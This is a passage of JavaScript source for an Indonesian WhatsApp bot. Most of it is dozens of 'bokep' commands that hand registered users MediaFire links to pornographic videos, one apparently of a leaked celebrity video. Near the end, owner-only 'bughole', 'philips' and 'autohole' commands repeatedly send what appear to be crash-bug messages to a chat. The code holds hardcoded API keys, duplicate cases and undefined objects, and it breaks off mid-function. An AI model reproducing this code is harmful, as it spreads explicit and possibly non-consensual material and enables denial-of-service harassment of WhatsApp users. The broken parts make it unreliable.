      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/kq9v0977mlvr5th/received_2970346673217135.mp4/file' })				   
       break
//=========================================================
case 'bokep72':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4fxizepseti0lmx/received_847640339228073.mp4/file' })				   
       break
//=========================================================
case 'bokep73':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cs0rjcibz1vjn7n/received_292426832387830.mp4/file' })				   
       break
//=========================================================
case 'bokep74':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/zyy0jvwxfbem33d/received_2980088018879894.mp4/file' })				   
       break
//=========================================================
case 'bokep75':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/2w3z0xefb9xzf0f/received_257088666186312.mp4/file' })				   
       break
//=========================================================
case 'bokep76':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/sgvfgu8s81kp9q4/received_446852896760262.mp4/file' })				   
       break
//=========================================================
case 'bokep77':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/s0w6s0vz89cpflj/received_296681828570048.mp4/file' })				   
       break
//=========================================================
case 'bokep78':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i2ocky8x6dxu2sx/received_920553082147928.mp4/file' })				   
       break
//=========================================================
case 'bokep79':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/so3lmb6o9ddlh8y/received_422897052499846.mp4/file' })				   
       break
//=========================================================
case 'bokep80':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4eis90da17labei/received_326273072598527.mp4/file' })				   
       break
//=========================================================
case 'bokep81':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/32lgtdbuednvql4/received_560733671813987.mp4/file' })				   
       break
//=========================================================
case 'bokep82':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/nbb5p7ckejg4jl5/received_1015326852640972.mp4/file' })				   
       break
//=========================================================
case 'bokep83':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/lpkb5wp3mfy9poa/received_423251782491805.mp4/file' })				   
       break
//=========================================================
case 'bokep84':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/nupks4cmp6k0dhm/received_387710329677654.mp4/file' })				   
       break
//=========================================================
case 'bokep85':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ew3cjqaliiw861w/received_577728976710112.mp4/file' })				   
       break
//=========================================================
case 'bokep86':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/hcn7xe1kxw4s7ss/received_3025767131001857.mp4/file' })				   
       break
//=========================================================
case 'bokep87':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\\nhttps://www.mediafire.com/file/9fy9dsm8ink8aaq/received_957169441499997.mp4/file' })				   
       break
//=========================================================
case 'bokep88':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/70bwgs0tzydqh6b/received_404981621022604.mp4/file' })				   
       break
//=========================================================
case 'bokep89':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/zdpfn5x3p2rtu2l/received_292781839355277.mp4/file' })				   
       break
//=========================================================
case 'bokep90':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tu17wcc66erjzgc/received_175578237972649.mp4/file' })				   
       break
//=========================================================
case 'bokep91':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/78d0swnwkhf5ucf/received_455493332466872.mp4/file' })				   
       break
//=========================================================
case 'bokep92':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7v9ue8y657wsnz4/received_1108084426664070.mp4/file' })				   
       break
//=========================================================
case 'bokep93':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/b2p19xj231yc3rs/received_302994851166017.mp4/file' })				   
       break
//=========================================================
case 'bokep94':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/abq2x1532vybg6p/received_407724170726561.mp4/file' })				   
       break
//=========================================================
case 'bokep95':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/uvr69txxyksomeu/received_519355046078010.mp4/file' })				   
       break
//=========================================================
case 'bokep96':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/n4h7xl2x3wt4j4d/received_2126161344189777.mp4/file' })				   
       break
//=========================================================
case 'bokep97':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/k7lszi6ry49abrh/received_848384158996757.mp4/file' })				   
       break
//=========================================================
case 'bokep98':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/uwcwmtxdqbwqu4x/received_4415932545152097.mp4/file' })				   
       break
//=========================================================
case 'bokep99':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/u8iws0q7vyjayxr/received_297632178474224.mp4/file' })				   
       break
//=========================================================
case 'bokep100':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/w6jb6mkn8wl777b/received_586107739304402.mp4/file' })				   
       break
//=========================================================
case 'bokep101':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/b83bwyaotlxv844/1_4976751237790695783.mp4/file' })				   
       break
//=========================================================
case 'bokep102':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/5bj2ok1jsodaeg5/1_4900014921128870442.mp4/file' })				   
       break
//=========================================================
case 'bokep103':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/gomcpgdn5fdosww/1_4900014921128870443.mp4/file' })				   
       break
//=========================================================
case 'bokep104':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pguxhjiut8e9yxe/1_4900014921128870444.mp4/file' })				   
       break
//=========================================================  
//=====================================================================================================================================================================================
case 'bokep105':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/rdtoq2jek9vq178/1_4900014921128870488.mp4/file' })				   
       break
//=========================================================
case 'bokep106':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/5bepobdlxyqxhri/1_4954217524368507200.mp4/file' })				   
       break
//=========================================================
case 'bokep107':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/46jty67xu4jubth/1_4965355615812583957.mp4/file' })				   
       break
//=========================================================
case 'bokep108':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4vs36ee9swd6mmu/1_4976971496598536441.mp4/file' })				   
       break
//=========================================================
case 'bokep109':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/89bvfbtkvdyzujf/1_4981088136852406618.mp4/file' })				   
       break
//=========================================================
case 'bokep110':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/txzud7cgm3ug911/5_6057902614815703468.mp4/file' })				   
       break
//=========================================================
case 'bokep111':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x10ll1fgdjwmxjy/5_6066671378961007692.mp4/file' })				   
       break
//=========================================================
case 'bokep112':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/2z6wr33duvwib91/5_6066885856742867530.mp4/file' })				   
       break
//=========================================================
case 'bokep113':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/n5asbncywbc4mpd/5_6080102776782717690.mp4/file' })				   
       break
//=========================================================
case 'bokep114':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/fg8vcvaazmmijz7/5_6082304196630021212.mp4/file' })				   
       break
//=========================================================
case 'bokep115':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/1y1tnynx211gfte/5_6102862572988400409.mp4/file' })				   
       break
//=========================================================
case 'bokep116':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })				   
       break
//=========================================================
case 'bokep117':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/y5w643thgnwzot6/5_6111492163013444474.mp4/file' })				   
       break
//=========================================================
case 'bokep118':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4272fkwbkuo3qnf/5_6120635641580487299.mp4/file' })				   
       break
//=========================================================
case 'bokep119':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/an8jur5b14nnr6u/masih+perawan.mp4/file' })				   
       break
//=========================================================
case 'bokep120':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cvhz28koynndrt6/5_6185738601234432420.mp4/file' })				   
       break
//=========================================================
case 'bokep121':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dnzirpx9rjaezyx/5_6237934329465406056.mp4/file' })				   
       break
//=========================================================
case 'bokep122':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/6tf11k7v03afoau/5_6239952311259496817.MP4/file' })				   
       break
//=========================================================
case 'bokep123':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/hk7d7fhzk8p0m0i/5_6291711421705093916.mp4/file' })				   
       break
//=========================================================
case 'bokep124':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/kryxh2njtlczliy/COLMEK+3+JARI+NIH+MANTEP+BET+MEMEK.mp4/file' })				   
       break
//=========================================================
case 'bokep125':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/35l1tqmi158uv68/DUH+CROT+DIMUKA+🥵🥵.mp4/file' })				   
       break
//=========================================================
case 'bokep126':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/rin6ks9syg89a33/Main+sama+si+doi+.mp4/file' })				   
       break
//=========================================================
case 'bokep127':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\\nhttps://www.mediafire.com/file/y4we169b72f9jhp/Seleb+yang+viral+itu+😍.mp4/file' })				   
       break
       case 'darkjoke': 	
buff = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=WannOff`, {method: 'get'})
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
      imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
      buttonsMessage = {footerText:'𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝙄𝙩𝙨𝙪𝙠𝙖𝘼𝙡𝙡𝙖𝙣', imageMessage: imageMsg,
      contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
      prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
      wann.relayWAMessage(prep)
break
//===============================================================
case 'meme':
case 'memek':

 buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=WannOff')

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'𝘾𝙧??𝙖𝙩𝙚𝙙 𝙄𝙩𝙨𝙪𝙠𝙖𝘼𝙡𝙡𝙖𝙣', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)
break
//======================================================================
case 'meme':
case 'memek':
 buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=WannOff')

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Created By Wann', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)
break





case 'othermenu':



case  'menuother':



wibu =` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}brainly *query*



▹  ${prefix}shopee *product*



▹  ${prefix}playstore *query*



▹  ${prefix}ssweb *query*



▹  ${prefix}google *query*



▹  ${prefix}image *query*



▹  ${prefix}pinterest *query*



▹  ${prefix}nulis *teks*



▹  ${prefix}iguser *ussername*



▹  ${prefix}igstalk *username*



▹  ${prefix}githubstalk *username*



▹  ${prefix}tiktokstalk *ussername*



▹  ${prefix}img2url *reply foto*



▹  ${prefix}ytsearch *query*



`







sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;







case 'gamemenu':



case  'menugame':



wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}slot



▹  ${prefix}voting



▹  ${prefix}limitgame



▹  ${prefix}gelud @tag



▹  ${prefix}tictactoe @tag



▹  ${prefix}siapaaku



▹  ${prefix}family100



▹  ${prefix}kuismath



▹  ${prefix}asahotak



▹  ${prefix}tebaklirik



▹  ${prefix}tebaklagu



▹  ${prefix}tebakkata



▹  ${prefix}susunkata



▹  ${prefix}kimiakuis



▹  ${prefix}caklontong



▹  ${prefix}tebakjenaka



▹  ${prefix}tebakanime



▹  ${prefix}tebaktebakan



▹  ${prefix}tebakgambar



▹  ${prefix}tebakbendera



▹  ${prefix}suit *batu/kertas/gunting*



`







sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;



case 'stickermenu':



case  'stikermenu':



wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}dadu



▹  ${prefix}bucinstick



▹  ${prefix}doge



▹  ${prefix}toimg



▹  ${prefix}patrick



▹  ${prefix}ttg *teks*



▹  ${prefix}attp *teks*



▹  ${prefix}stickeranime



▹  ${prefix}semoji *emoji*



▹  ${prefix}sticker *reply foto/video*



▹  ${prefix}smeme *teks|teks*



▹  ${prefix}swm *pack|author*



▹  ${prefix}take *pack|author* 



▹  ${prefix}tovideo *reply sgif*



▹  ${prefix}triggered *reply image*



`















sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;



case 'funmenu':



case  'menufun':



wibu =` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}mining



▹  ${prefix}cekwatak



▹  ${prefix}cekmati [nama]



▹  ${prefix}wangy [nama]



▹  ${prefix}citacita



▹  ${prefix}toxic



▹  ${prefix}truth



▹  ${prefix}dare



▹  ${prefix}apakah



▹  ${prefix}bisakah



▹  ${prefix}kapankah



▹  ${prefix}rate



▹  ${prefix}jadian



▹  ${prefix}cantik



▹  ${prefix}ganteng



▹  ${prefix}beban



▹  ${prefix}babi



▹  ${prefix}cekganteng



▹  ${prefix}cekcantik







`



sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;

case 'antibadword':
  if (!isGroup) return reply(mess.OnlyGrup)
  if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
  if (!isBotGroupAdmins) return reply(mess.BotAdmin)
  if (args.length === 1) return reply(`Pilih enable atau disable`)
  if (args[1].toLowerCase() === 'enable'){
      if (isBadword) return reply(`Udah aktif`)
      grupbadword.push(from)
fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
  } else if (args[1].toLowerCase() === 'disable'){
      anu = grupbadword.indexOf(from)
      grupbadword.splice(anu, 1)
      fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
      reply('antibadword grup nonaktif')
  } else {
      testqq(from, `antibadword`)
  }
  break
  case 'bughole': {
  if (!wan.key.fromMe) return reply(mess.me)
  if (args.length < 1) return reply('Jumlahnya?')
  for (let i = 0; i < args[0]; i++) {
  bugHole(from, 0)
  wann.relayWAMessage(global.mm=arifi.
  prepareMessageFromContent(from, arifi.
  prepareDisappearingMessageSettingContent(0),
  {}),{waitForAck:!0})
  }
  }
  break;
//=================================================
case 'philips': {
  if (!wan.key.fromMe) return reply(mess.me)
  if (args.length < 1) return reply('Jumlahnya?')
  for (let i = 0; i < args[0]; i++) {
  Philips(from, 0)
  }
  }
  break;
//=================================================
case 'autohole': {
  if (!wan.key.fromMe) return reply(mess.me)
  if (args.length < 1) return reply('Jumlahnya?')
  for (let i = 0; i < args[0]; i++) {
  sendBug(from, 0)
  }
  wann.updatePresence(from, Presence.composing)
  me = wann.user
  uptime = process.uptime()
  ImageFakes = 'https://i.ibb.co/q19178v/IMG-20210410-142952.jpg'
  bro = await getBuffer(ImageFakes)
  var num = wan.participant
  async function autoplay(targett){
